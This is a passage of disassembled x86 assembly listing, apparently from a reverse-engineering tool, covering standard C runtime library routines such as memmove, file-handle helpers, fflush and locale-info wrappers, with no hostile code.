		align 4

loc_100BAC8:				; CODE XREF: _memmove+1Aj
		lea	esi, [ecx+esi-4]
		lea	edi, [ecx+edi-4]
		test	edi, 3
		jnz	short loc_100BAFC
		shr	ecx, 2
		and	edx, 3
		cmp	ecx, 8
		jb	short loc_100BAF0
		std
		rep movsd
		cld
		jmp	ds:off_100BC10[edx*4]
; ---------------------------------------------------------------------------
		align 10h

loc_100BAF0:				; CODE XREF: _memmove+1B1j
					; _memmove+208j ...
		neg	ecx
		jmp	ds:off_100BBC0[ecx*4]
; ---------------------------------------------------------------------------
		align 4

loc_100BAFC:				; CODE XREF: _memmove+1A6j
		mov	eax, edi
		mov	edx, 3
		cmp	ecx, 4
		jb	short loc_100BB14
		and	eax, 3
		sub	ecx, eax
		jmp	dword ptr ds:loc_100BB14+4[eax*4]
; ---------------------------------------------------------------------------

loc_100BB14:				; CODE XREF: _memmove+1D6j
					; DATA XREF: _memmove+1DDr
		jmp	ds:off_100BC10[ecx*4]
; ---------------------------------------------------------------------------
		align 4
		dd offset loc_100BB28
; ---------------------------------------------------------------------------
		dec	eax
		mov	ebx, 0BB700100h
		add	[ecx], al

loc_100BB28:				; DATA XREF: _memmove+1ECo
		mov	al, [esi+3]
		and	edx, ecx
		mov	[edi+3], al
		dec	esi
		shr	ecx, 2
		dec	edi
		cmp	ecx, 8
		jb	short loc_100BAF0
		std
		rep movsd
		cld
		jmp	ds:off_100BC10[edx*4]
; ---------------------------------------------------------------------------
		align 4
		mov	al, [esi+3]
		and	edx, ecx
		mov	[edi+3], al
		mov	al, [esi+2]
		shr	ecx, 2
		mov	[edi+2], al
		sub	esi, 2
		sub	edi, 2
		cmp	ecx, 8
		jb	short loc_100BAF0
		std
		rep movsd
		cld
		jmp	ds:off_100BC10[edx*4]
; ---------------------------------------------------------------------------
		align 10h
		mov	al, [esi+3]
		and	edx, ecx
		mov	[edi+3], al
		mov	al, [esi+2]
		mov	[edi+2], al
		mov	al, [esi+1]
		shr	ecx, 2
		mov	[edi+1], al
		sub	esi, 3
		sub	edi, 3
		cmp	ecx, 8
		jb	loc_100BAF0
		std
		rep movsd
		cld
		jmp	ds:off_100BC10[edx*4]
; ---------------------------------------------------------------------------
		align 4
		dd offset loc_100BBC4
		dd offset loc_100BBCC
		dd offset loc_100BBD4
		dd offset loc_100BBDC
		dd offset loc_100BBE4
		dd offset loc_100BBEC
		dd offset loc_100BBF4
off_100BBC0	dd offset loc_100BC07	; DATA XREF: _memmove+1C2r
; ---------------------------------------------------------------------------

loc_100BBC4:				; DATA XREF: _memmove+274o
		mov	eax, [esi+ecx*4+1Ch]
		mov	[edi+ecx*4+1Ch], eax

loc_100BBCC:				; DATA XREF: _memmove+278o
		mov	eax, [esi+ecx*4+18h]
		mov	[edi+ecx*4+18h], eax

loc_100BBD4:				; DATA XREF: _memmove+27Co
		mov	eax, [esi+ecx*4+14h]
		mov	[edi+ecx*4+14h], eax

loc_100BBDC:				; DATA XREF: _memmove+280o
		mov	eax, [esi+ecx*4+10h]
		mov	[edi+ecx*4+10h], eax

loc_100BBE4:				; DATA XREF: _memmove+284o
		mov	eax, [esi+ecx*4+0Ch]
		mov	[edi+ecx*4+0Ch], eax

loc_100BBEC:				; DATA XREF: _memmove+288o
		mov	eax, [esi+ecx*4+8]
		mov	[edi+ecx*4+8], eax

loc_100BBF4:				; DATA XREF: _memmove+28Co
		mov	eax, [esi+ecx*4+4]
		mov	[edi+ecx*4+4], eax
		lea	eax, ds:0[ecx*4]
		add	esi, eax
		add	edi, eax

loc_100BC07:				; CODE XREF: _memmove+1C2j
					; DATA XREF: _memmove:off_100BBC0o
		jmp	ds:off_100BC10[edx*4]
; ---------------------------------------------------------------------------
		align 10h
off_100BC10	dd offset loc_100BC20	; DATA XREF: _memmove+1B7r
					; _memmove:loc_100BB14r ...
		dd offset loc_100BC28
		dd offset loc_100BC38
		dd offset loc_100BC4C
; ---------------------------------------------------------------------------

loc_100BC20:				; CODE XREF: _memmove+1B7j
					; _memmove:loc_100BB14j ...
		mov	eax, [ebp+arg_0]
		pop	esi
		pop	edi
		leave
		retn
; ---------------------------------------------------------------------------
		align 4

loc_100BC28:				; CODE XREF: _memmove+1B7j
					; _memmove:loc_100BB14j ...
		mov	al, [esi+3]
		mov	[edi+3], al
		mov	eax, [ebp+arg_0]
		pop	esi
		pop	edi
		leave
		retn
; ---------------------------------------------------------------------------
		align 4

loc_100BC38:				; CODE XREF: _memmove+1B7j
					; _memmove:loc_100BB14j ...
		mov	al, [esi+3]
		mov	[edi+3], al
		mov	al, [esi+2]
		mov	[edi+2], al
		mov	eax, [ebp+arg_0]
		pop	esi
		pop	edi
		leave
		retn
; ---------------------------------------------------------------------------
		align 4

loc_100BC4C:				; CODE XREF: _memmove+1B7j
					; _memmove:loc_100BB14j ...
		mov	al, [esi+3]
		mov	[edi+3], al
		mov	al, [esi+2]
		mov	[edi+2], al
		mov	al, [esi+1]
		mov	[edi+1], al
		mov	eax, [ebp+arg_0]
		pop	esi
		pop	edi
		leave
		retn
_memmove	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

__dosmaperr	proc near		; CODE XREF: __write+1B2p
					; __lseeki64+6Dp ...

arg_0		= dword	ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		mov	eax, [ebp+arg_0]
		mov	__doserrno, eax
		xor	ecx, ecx

loc_100BC79:				; CODE XREF: __dosmaperr+1Cj
		cmp	eax, dword_100E820[ecx*8]
		jz	short loc_100BC9E
		inc	ecx
		cmp	ecx, 2Dh
		jb	short loc_100BC79
		cmp	eax, 13h
		jb	short loc_100BCAC
		cmp	eax, 24h
		ja	short loc_100BCAC
		mov	_errno,	0Dh
		pop	ebp
		retn
; ---------------------------------------------------------------------------

loc_100BC9E:				; CODE XREF: __dosmaperr+16j
		mov	eax, dword_100E824[ecx*8]
		mov	_errno,	eax
		pop	ebp
		retn
; ---------------------------------------------------------------------------

loc_100BCAC:				; CODE XREF: __dosmaperr+21j
					; __dosmaperr+26j
		cmp	eax, 0BCh
		jb	short loc_100BCC4
		cmp	eax, 0CAh
		mov	_errno,	8
		jbe	short loc_100BCCE

loc_100BCC4:				; CODE XREF: __dosmaperr+47j
		mov	_errno,	16h

loc_100BCCE:				; CODE XREF: __dosmaperr+58j
		pop	ebp
		retn
__dosmaperr	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

__free_osfhnd	proc near		; CODE XREF: __close+85p

arg_0		= dword	ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		mov	ecx, [ebp+arg_0]
		cmp	ecx, __nhandle
		push	esi
		push	edi
		jnb	short loc_100BD3C
		mov	eax, ecx
		sar	eax, 5
		mov	esi, ecx
		lea	edi, ds:1011B40h[eax*4]
		mov	eax, [edi]
		and	esi, 1Fh
		shl	esi, 3
		add	eax, esi
		test	byte ptr [eax+4], 1
		jz	short loc_100BD3C
		cmp	dword ptr [eax], 0FFFFFFFFh
		jz	short loc_100BD3C
		cmp	___app_type, 1
		jnz	short loc_100BD32
		xor	eax, eax
		sub	ecx, eax
		jz	short loc_100BD29
		dec	ecx
		jz	short loc_100BD24
		dec	ecx
		jnz	short loc_100BD32
		push	eax
		push	0FFFFFFF4h
		jmp	short loc_100BD2C
; ---------------------------------------------------------------------------

loc_100BD24:				; CODE XREF: __free_osfhnd+45j
		push	eax
		push	0FFFFFFF5h
		jmp	short loc_100BD2C
; ---------------------------------------------------------------------------

loc_100BD29:				; CODE XREF: __free_osfhnd+42j
		push	eax		; hHandle
		push	0FFFFFFF6h	; nStdHandle

loc_100BD2C:				; CODE XREF: __free_osfhnd+4Dj
					; __free_osfhnd+52j
		call	ds:__imp__SetStdHandle@8 ; SetStdHandle(x,x)

loc_100BD32:				; CODE XREF: __free_osfhnd+3Cj
					; __free_osfhnd+48j
		mov	eax, [edi]
		or	dword ptr [esi+eax], 0FFFFFFFFh
		xor	eax, eax
		jmp	short loc_100BD50
; ---------------------------------------------------------------------------

loc_100BD3C:				; CODE XREF: __free_osfhnd+10j
					; __free_osfhnd+2Ej ...
		and	__doserrno, 0
		mov	_errno,	9
		or	eax, 0FFFFFFFFh

loc_100BD50:				; CODE XREF: __free_osfhnd+65j
		pop	edi
		pop	esi
		pop	ebp
		retn
__free_osfhnd	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; __int32 __cdecl _get_osfhandle(int)
__get_osfhandle	proc near		; CODE XREF: __lseeki64+3Ep
					; __commit+29p	...

arg_0		= dword	ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		mov	eax, [ebp+arg_0]
		cmp	eax, __nhandle
		jnb	short loc_100BD85
		mov	ecx, eax
		sar	ecx, 5
		mov	ecx, ___pioinfo[ecx*4]
		and	eax, 1Fh
		lea	eax, [ecx+eax*8]
		test	byte ptr [eax+4], 1
		jz	short loc_100BD85
		mov	eax, [eax]
		pop	ebp
		retn
; ---------------------------------------------------------------------------

loc_100BD85:				; CODE XREF: __get_osfhandle+Ej
					; __get_osfhandle+26j
		and	__doserrno, 0
		mov	_errno,	9
		or	eax, 0FFFFFFFFh
		pop	ebp
		retn
__get_osfhandle	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; __int64 __cdecl _lseeki64(int, __int64, int)
__lseeki64	proc near		; CODE XREF: __write+7Cp

lDistanceToMove	= dword	ptr -8
DistanceToMoveHigh= dword ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h
dwMoveMethod	= dword	ptr  14h

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		push	ecx
		push	ecx
		mov	eax, [ebp+arg_0]
		cmp	eax, __nhandle
		push	esi
		push	edi
		jnb	short loc_100BE26
		mov	ecx, eax
		sar	ecx, 5
		mov	esi, eax
		and	esi, 1Fh
		lea	edi, ds:1011B40h[ecx*4]
		mov	ecx, [edi]
		shl	esi, 3
		test	byte ptr [ecx+esi+4], 1
		jz	short loc_100BE26
		mov	ecx, [ebp+arg_4]
		mov	[ebp+lDistanceToMove], ecx
		mov	ecx, [ebp+arg_8]
		push	eax		; int
		mov	[ebp+DistanceToMoveHigh], ecx
		call	__get_osfhandle
		cmp	eax, 0FFFFFFFFh
		pop	ecx
		jz	short loc_100BE2D
		push	[ebp+dwMoveMethod] ; dwMoveMethod
		lea	ecx, [ebp+DistanceToMoveHigh]
		push	ecx		; lpDistanceToMoveHigh
		push	[ebp+lDistanceToMove] ;	lDistanceToMove
		push	eax		; hFile
		call	ds:__imp__SetFilePointer@16 ; SetFilePointer(x,x,x,x)
		cmp	eax, 0FFFFFFFFh
		mov	[ebp+lDistanceToMove], eax
		jnz	short loc_100BE15
		call	ds:__imp__GetLastError@0 ; GetLastError()
		test	eax, eax
		jz	short loc_100BE15
		push	eax
		call	__dosmaperr
		pop	ecx
		jmp	short loc_100BE37
; ---------------------------------------------------------------------------

loc_100BE15:				; CODE XREF: __lseeki64+60j
					; __lseeki64+6Aj
		mov	eax, [edi]
		lea	eax, [eax+esi+4]
		and	byte ptr [eax],	0FDh
		mov	eax, [ebp+lDistanceToMove]
		mov	edx, [ebp+DistanceToMoveHigh]
		jmp	short loc_100BE3D
; ---------------------------------------------------------------------------

loc_100BE26:				; CODE XREF: __lseeki64+12j
					; __lseeki64+2Fj
		and	__doserrno, 0

loc_100BE2D:				; CODE XREF: __lseeki64+47j
		mov	_errno,	9

loc_100BE37:				; CODE XREF: __lseeki64+73j
		or	eax, 0FFFFFFFFh
		or	edx, 0FFFFFFFFh

loc_100BE3D:				; CODE XREF: __lseeki64+84j
		pop	edi
		pop	esi
		leave
		retn
__lseeki64	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================


; int __cdecl _fcloseall()
__fcloseall	proc near		; CODE XREF: ___endstdio+Ej
		mov	edi, edi
		push	esi
		push	edi
		push	3
		pop	esi
		xor	edi, edi
		cmp	__nstream, esi
		jle	short loc_100BE9B

loc_100BE57:				; CODE XREF: __fcloseall+53j
		mov	eax, ___piob
		mov	eax, [eax+esi*4]
		test	eax, eax
		jz	short loc_100BE92
		test	byte ptr [eax+0Ch], 83h
		jz	short loc_100BE76
		push	eax		; File
		call	_fclose
		cmp	eax, 0FFFFFFFFh
		pop	ecx
		jz	short loc_100BE76
		inc	edi

loc_100BE76:				; CODE XREF: __fcloseall+21j
					; __fcloseall+2Dj
		cmp	esi, 14h
		jl	short loc_100BE92
		mov	eax, ___piob
		push	dword ptr [eax+esi*4] ;	Memory
		call	_free
		mov	eax, ___piob
		and	dword ptr [eax+esi*4], 0
		pop	ecx

loc_100BE92:				; CODE XREF: __fcloseall+1Bj
					; __fcloseall+33j
		inc	esi
		cmp	esi, __nstream
		jl	short loc_100BE57

loc_100BE9B:				; CODE XREF: __fcloseall+Fj
		mov	eax, edi
		pop	edi
		pop	esi
		retn
__fcloseall	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

__flush		proc near		; CODE XREF: _fflush+17p _fclose+1Ep

arg_0		= dword	ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		push	ebx
		push	esi
		mov	esi, [ebp+arg_0]
		mov	eax, [esi+0Ch]
		mov	ecx, eax
		and	cl, 3
		xor	ebx, ebx
		cmp	cl, 2
		jnz	short loc_100BEF8
		test	ax, 108h
		jz	short loc_100BEF8
		mov	eax, [esi+8]
		push	edi
		mov	edi, [esi]
		sub	edi, eax
		test	edi, edi
		jle	short loc_100BEF7
		push	edi		; unsigned int
		push	eax		; void *
		push	dword ptr [esi+10h] ; int
		call	__write
		add	esp, 0Ch
		cmp	eax, edi
		jnz	short loc_100BEF0
		mov	eax, [esi+0Ch]
		test	al, al
		jns	short loc_100BEF7
		and	eax, 0FFFFFFFDh
		mov	[esi+0Ch], eax
		jmp	short loc_100BEF7
; ---------------------------------------------------------------------------

loc_100BEF0:				; CODE XREF: __flush+3Aj
		or	dword ptr [esi+0Ch], 20h
		or	ebx, 0FFFFFFFFh

loc_100BEF7:				; CODE XREF: __flush+29j __flush+41j ...
		pop	edi

loc_100BEF8:				; CODE XREF: __flush+17j __flush+1Dj
		mov	eax, [esi+8]
		and	dword ptr [esi+4], 0
		mov	[esi], eax
		pop	esi
		mov	eax, ebx
		pop	ebx
		pop	ebp
		retn
__flush		endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl fflush(FILE *File)
_fflush		proc near		; CODE XREF: sub_100BF51+31p
					; sub_100BF51+4Bp

File		= dword	ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		push	esi
		mov	esi, [ebp+File]
		test	esi, esi
		jnz	short loc_100BF22
		push	esi
		call	sub_100BF51
		pop	ecx
		jmp	short loc_100BF49
; ---------------------------------------------------------------------------

loc_100BF22:				; CODE XREF: _fflush+Bj
		push	esi
		call	__flush
		test	eax, eax
		pop	ecx
		jz	short loc_100BF32
		or	eax, 0FFFFFFFFh
		jmp	short loc_100BF49
; ---------------------------------------------------------------------------

loc_100BF32:				; CODE XREF: _fflush+1Fj
		test	byte ptr [esi+0Dh], 40h
		jz	short loc_100BF47
		push	dword ptr [esi+10h] ; int
		call	__commit
		neg	eax
		pop	ecx
		sbb	eax, eax
		jmp	short loc_100BF49
; ---------------------------------------------------------------------------

loc_100BF47:				; CODE XREF: _fflush+2Aj
		xor	eax, eax

loc_100BF49:				; CODE XREF: _fflush+14j _fflush+24j ...
		pop	esi
		pop	ebp
		retn
_fflush		endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_100BF51	proc near		; CODE XREF: _fflush+Ep __flushall+2p

arg_0		= dword	ptr  8

		mov	edi, edi
		push	ebp
		mov	ebp, esp
		push	ebx
		push	esi
		push	edi
		xor	esi, esi
		xor	ebx, ebx
		xor	edi, edi
		cmp	__nstream, esi
		jle	short loc_100BFB2

loc_100BF67:				; CODE XREF: sub_100BF51+5Fj
		mov	eax, ___piob
		mov	eax, [eax+esi*4]
		test	eax, eax
		jz	short loc_100BFA9
		mov	ecx, [eax+0Ch]
		test	cl, 83h
		jz	short loc_100BFA9
		cmp	[ebp+arg_0], 1
		jnz	short loc_100BF90
		push	eax		; File
		call	_fflush
		cmp	eax, 0FFFFFFFFh
		pop	ecx
		jz	short loc_100BFA9
		inc	ebx
		jmp	short loc_100BFA9
; ---------------------------------------------------------------------------

loc_100BF90:				; CODE XREF: sub_100BF51+2Ej
		cmp	[ebp+arg_0], 0
		jnz	short loc_100BFA9
		test	cl, 2
		jz	short loc_100BFA9
		push	eax		; File
		call	_fflush
		cmp	eax, 0FFFFFFFFh
		pop	ecx
		jnz	short loc_100BFA9
		or	edi, eax

loc_100BFA9:				; CODE XREF: sub_100BF51+20j
					; sub_100BF51+28j ...
		inc	esi
		cmp	esi, __nstream
		jl	short loc_100BF67

loc_100BFB2:				; CODE XREF: sub_100BF51+14j
		cmp	[ebp+arg_0], 1
		mov	eax, ebx
		jz	short loc_100BFBC
		mov	eax, edi

loc_100BFBC:				; CODE XREF: sub_100BF51+67j
		pop	edi
		pop	esi
		pop	ebx
		pop	ebp
		retn
sub_100BF51	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================


; int __cdecl _flushall()
__flushall	proc near		; CODE XREF: ___endstdiop
		push	1
		call	sub_100BF51
		pop	ecx
		retn
__flushall	endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: noreturn

__fptrap	proc near		; DATA XREF: .data:__cfltcvt_tabo
					; .data:0100E704o ...
		push	2
		call	__amsg_exit
__fptrap	endp

; ---------------------------------------------------------------------------
		pop	ecx
		retn
; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl __crtGetLocaleInfoW(LCID Locale, LCTYPE LCType, LPWSTR lpWideCharStr, int	cchWideChar, UINT CodePage)
___crtGetLocaleInfoW proc near		; CODE XREF: ___getlocaleinfo+108p

var_28		= dword	ptr -28h
var_24		= dword	ptr -24h
Size		= dword	ptr -20h
var_1C		= dword	ptr -1Ch
ms_exc		= CPPEH_RECORD ptr -18h
Locale		= dword	ptr  8
LCType		= dword	ptr  0Ch
lpWideCharStr	= dword	ptr  10h
cchWideChar	= dword	ptr  14h
CodePage	= dword	ptr  18h

		push	18h
		push	offset stru_10037F0
		call	__SEH_prolog
		xor	edi, edi
		xor	ebx, ebx
		inc	ebx
		cmp	dword_10107EC, edi
		jnz	short loc_100C026
		push	edi		; cchData
		push	edi		; lpLCData
		push	ebx		; LCType
		push	edi		; Locale
		call	ds:__imp__GetLocaleInfoW@16 ; GetLocaleInfoW(x,x,x,x)
		test	eax, eax
		jz	short loc_100C011
		mov	dword_10107EC, ebx
		jmp	short loc_100C026
; ---------------------------------------------------------------------------

loc_100C011:				; CODE XREF: ___crtGetLocaleInfoW+25j
		call	ds:__imp__GetLastError@0 ; GetLastError()
		cmp	eax, 78h
		jnz	short loc_100C026
		mov	dword_10107EC, 2

loc_100C026:				; CODE XREF: ___crtGetLocaleInfoW+17j
					; ___crtGetLocaleInfoW+2Dj ...
		mov	eax, dword_10107EC
		cmp	eax, ebx
		jnz	short loc_100C046
		push	[ebp+cchWideChar] ; cchData
		push	[ebp+lpWideCharStr] ; lpLCData
		push	[ebp+LCType]	; LCType
		push	[ebp+Locale]	; Locale
		call	ds:__imp__GetLocaleInfoW@16 ; GetLocaleInfoW(x,x,x,x)
		jmp	loc_100C109
; ---------------------------------------------------------------------------

loc_100C046:				; CODE XREF: ___crtGetLocaleInfoW+4Bj
		cmp	eax, 2
		jz	short loc_100C04F
		cmp	eax, edi
		jnz	short loc_100C077

loc_100C04F:				; CODE XREF: ___crtGetLocaleInfoW+67j
		mov	[ebp+var_1C], edi
		mov	[ebp+var_24], edi
		cmp	[ebp+CodePage],	edi
		jnz	short loc_100C062
		mov	eax, ___lc_codepage
		mov	[ebp+CodePage],	eax

loc_100C062:				; CODE XREF: ___crtGetLocaleInfoW+76j
		push	edi		; cchData
		push	edi		; lpLCData
		push	[ebp+LCType]	; LCType
		push	[ebp+Locale]	; Locale
		call	ds:__imp__GetLocaleInfoA@16 ; GetLocaleInfoA(x,x,x,x)
		mov	[ebp+Size], eax
		cmp	eax, edi
		jnz	short loc_100C07E

loc_100C077:				; CODE XREF: ___crtGetLocaleInfoW+6Bj
					; ___crtGetLocaleInfoW+E0j
		xor	eax, eax
		jmp	loc_100C109
; ---------------------------------------------------------------------------

loc_100C07E:				; CODE XREF: ___crtGetLocaleInfoW+93j
		mov	[ebp+ms_exc.disabled], edi
		add	eax, 3
		and	eax, 0FFFFFFFCh
		call	__chkstk
		mov	[ebp+ms_exc.old_esp], esp
		mov	esi, esp
		mov	[ebp+var_28], esi
		or	[ebp+ms_exc.disabled], 0FFFFFFFFh
		jmp	short loc_100C0B1
; ---------------------------------------------------------------------------

loc_100C09A:				; DATA XREF: .text:stru_10037F0o
		xor	eax, eax	; Exception filter 0 for function 100BFE2
		inc	eax
		retn
; ---------------------------------------------------------------------------

loc_100C09E:				; DATA XREF: .text:stru_10037F0o
		mov	esp, [ebp+ms_exc.old_esp] ; Exception handler 0	for function 100BFE2
		call	__resetstkoflw
		xor	edi, edi
		xor	esi, esi
		or	[ebp+ms_exc.disabled], 0FFFFFFFFh
		xor	ebx, ebx
		inc	ebx

loc_100C0B1:				; CODE XREF: ___crtGetLocaleInfoW+B6j
		cmp	esi, edi
		jnz	short loc_100C0C7
		push	[ebp+Size]	; Size
		call	_malloc
		pop	ecx
		mov	esi, eax
		cmp	esi, edi
		jz	short loc_100C077
		mov	[ebp+var_24], ebx

loc_100C0C7:				; CODE XREF: ___crtGetLocaleInfoW+D1j
		push	[ebp+Size]	; cchData
		push	esi		; lpLCData
		push	[ebp+LCType]	; LCType
		push	[ebp+Locale]	; Locale
		call	ds:__imp__GetLocaleInfoA@16 ; GetLocaleInfoA(x,x,x,x)
		test	eax, eax
		jz	short loc_100C0FA
		cmp	[ebp+cchWideChar], edi
		jnz	short loc_100C0E4
		push	edi
		push	edi
		jmp	short loc_100C0EA
; ---------------------------------------------------------------------------

loc_100C0E4:				; CODE XREF: ___crtGetLocaleInfoW+FCj
		push	[ebp+cchWideChar] ; cchWideChar
		push	[ebp+lpWideCharStr] ; lpWideCharStr

loc_100C0EA:				; CODE XREF: ___crtGetLocaleInfoW+100j
		push	0FFFFFFFFh	; cbMultiByte
		push	esi		; lpMultiByteStr
		push	ebx		; dwFlags
		push	[ebp+CodePage]	; CodePage
		call	ds:__imp__MultiByteToWideChar@24 ; MultiByteToWideChar(x,x,x,x,x,x)
		mov	[ebp+var_1C], eax

loc_100C0FA:				; CODE XREF: ___crtGetLocaleInfoW+F7j
		cmp	[ebp+var_24], edi
		jz	short loc_100C106
		push	esi		; Memory
		call	_free
		pop	ecx

loc_100C106:				; CODE XREF: ___crtGetLocaleInfoW+11Bj
		mov	eax, [ebp+var_1C]

loc_100C109:				; CODE XREF: ___crtGetLocaleInfoW+5Fj
					; ___crtGetLocaleInfoW+97j
		lea	esp, [ebp-34h]
		call	__SEH_epilog
		retn
___crtGetLocaleInfoW endp

; ---------------------------------------------------------------------------
		db 5 dup(0CCh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __cdecl __crtGetLocaleInfoA(LCID Locale, LCTYPE LCType, LPSTR lpLCData, int cchData, UINT	CodePage)
___crtGetLocaleInfoA proc near		; CODE XREF: ___getlocaleinfo+46p
					; ___getlocaleinfo+68p	...

var_28		= dword	ptr -28h
var_24		= dword	ptr -24h
var_20		= dword	ptr -20h
var_1C		= dword	ptr -1Ch
ms_exc		= CPPEH_RECORD ptr -18h
Locale		= dword	ptr  8
LCType		= dword	ptr  0Ch
lpLCData	= dword	ptr  10h
cchData		= dword	ptr  14h
CodePage	= dword	ptr  18h

		push	18h
		push	offset stru_1003800
		call	__SEH_prolog
		xor	esi, esi
		cmp	dword_10107F0, esi
		jnz	short loc_100C15B
		push	esi		; cchData
		push	esi		; lpLCData
		xor	edi, edi
		inc	edi
		push	edi		; LCType
		push	esi		; Locale
		call	ds:__imp__GetLocaleInfoW@16 ; GetLocaleInfoW(x,x,x,x)
		test	eax, eax
		jz	short loc_100C146
		mov	dword_10107F0, edi
		jmp	short loc_100C15B
; ---------------------------------------------------------------------------

loc_100C146:				; CODE XREF: ___crtGetLocaleInfoA+25j
		call	ds:__imp__GetLastError@0 ; GetLastError()
		cmp	eax, 78h
		jnz	short loc_100C15B
		mov	dword_10107F0, 2

loc_100C15B:				; CODE XREF: ___crtGetLocaleInfoA+14j
					; ___crtGetLocaleInfoA+2Dj ...
		mov	eax, dword_10107F0
		cmp	eax, 2
		jz	loc_100C23C
		cmp	eax, esi
		jz	loc_100C23C
		cmp	eax, 1
		jnz	short loc_100C1A0
		mov	[ebp+var_1C], esi
		mov	[ebp+var_20], esi
		cmp	[ebp+CodePage],	esi
		jnz	short loc_100C189
		mov	eax, ___lc_codepage
		mov	[ebp+CodePage],	eax

loc_100C189:				; CODE XREF: ___crtGetLocaleInfoA+68j
		push	esi		; cchData
		push	esi		; lpLCData
		push	[ebp+LCType]	; LCType
		push	[ebp+Locale]	; Locale
		call	ds:__imp__GetLocaleInfoW@16 ; GetLocaleInfoW(x,x,x,x)
		mov	ebx, eax
		mov	[ebp+var_24], ebx
		cmp	ebx, esi
		jnz	short loc_100C1A7

loc_100C1A0:				; CODE XREF: ___crtGetLocaleInfoA+5Dj
					; ___crtGetLocaleInfoA+D8j
		xor	eax, eax
		jmp	loc_100C24E
; ---------------------------------------------------------------------------

loc_100C1A7:				; CODE XREF: ___crtGetLocaleInfoA+87j
		mov	[ebp+ms_exc.disabled], esi
		lea	eax, [ebx+ebx]
		add	eax, 3
		and	eax, 0FFFFFFFCh
		call	__chkstk
		mov	[ebp+ms_exc.old_esp], esp
		mov	edi, esp
		mov	[ebp+var_28], edi
		or	[ebp+ms_exc.disabled], 0FFFFFFFFh
		jmp	short loc_100C1DD
; ---------------------------------------------------------------------------

loc_100C1C6:				; DATA XREF: .text:stru_1003800o
		xor	eax, eax	; Exception filter 0 for function 100C117
		inc	eax
		retn
; ---------------------------------------------------------------------------

loc_100C1CA:				; DATA XREF: .text:stru_1003800o
		mov	esp, [ebp+ms_exc.old_esp] ; Exception handler 0	for function 100C117
		call	__resetstkoflw
		xor	esi, esi
		xor	edi, edi
		or	[ebp+ms_exc.disabled], 0FFFFFFFFh
		mov	ebx, [ebp+var_24]

loc_100C1DD:				; CODE XREF: ___crtGetLocaleInfoA+ADj
		cmp	edi, esi
		jnz	short loc_100C1F8
		lea	eax, [ebx+ebx]
		push	eax		; Size
		call	_malloc
		pop	ecx
		mov	edi, eax
		cmp	edi, esi
		jz	short loc_100C1A0
		mov	[ebp+var_20], 1

loc_100C1F8:				; CODE XREF: ___crtGetLocaleInfoA+C8j
		push	ebx		; cchData
		push	edi		; lpLCData
		push	[ebp+LCType]	; LCType
		push	[ebp+Locale]	; Locale
		call	ds:__imp__GetLocaleInfoW@16 ; GetLocaleInfoW(x,x,x,x)
		test	eax, eax
		jz	short loc_100C22B
		push	esi		; lpUsedDefaultChar
		push	esi		; lpDefaultChar
		cmp	[ebp+cchData], esi
		jnz	short loc_100C215
		push	esi
		push	esi
		jmp	short loc_100C21B
; ---------------------------------------------------------------------------

loc_100C215:				; CODE XREF: ___crtGetLocaleInfoA+F8j
		push	[ebp+cchData]	; cbMultiByte
		push	[ebp+lpLCData]	; lpMultiByteStr

loc_100C21B:				; CODE XREF: ___crtGetLocaleInfoA+FCj
		push	0FFFFFFFFh	; cchWideChar
		push	edi		; lpWideCharStr
		push	esi		; dwFlags
		push	[ebp+CodePage]	; CodePage
		call	ds:__imp__WideCharToMultiByte@32 ; WideCharToMultiByte(x,x,x,x,x,x,x,x)
		mov	[ebp+var_1C], eax

loc_100C22B:				; CODE XREF: ___crtGetLocaleInfoA+F1j
		cmp	[ebp+var_20], esi
		jz	short loc_100C237
		push	edi		; Memory
		call	_free
		pop	ecx

loc_100C237:				; CODE XREF: ___crtGetLocaleInfoA+117j
		mov	eax, [ebp+var_1C]
		jmp	short loc_100C24E
; ---------------------------------------------------------------------------

loc_100C23C:				; CODE XREF: ___crtGetLocaleInfoA+4Cj
					; ___crtGetLocaleInfoA+54j
		push	[ebp+cchData]	; cchData
		push	[ebp+lpLCData]	; lpLCData
		push	[ebp+LCType]	; LCType
		push	[ebp+Locale]	; Locale
		call	ds:__imp__GetLocaleInfoA@16 ; GetLocaleInfoA(x,x,x,x)

loc_100C24E:				; CODE XREF: ___crtGetLocaleInfoA+8Bj
					; ___crtGetLocaleInfoA+123j
		lea	esp, [ebp-34h]
		call	__SEH_epilog
		retn
___crtGetLocaleInfoA endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

___ascii_stricmp proc near		; CODE XREF: __stricmp+Fj

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	edi
		push	esi
		push	ebx
		mov	esi, [ebp+arg_4]
		mov	edi, [ebp+arg_0]
		mov	al, 0FFh
		mov	edi, edi

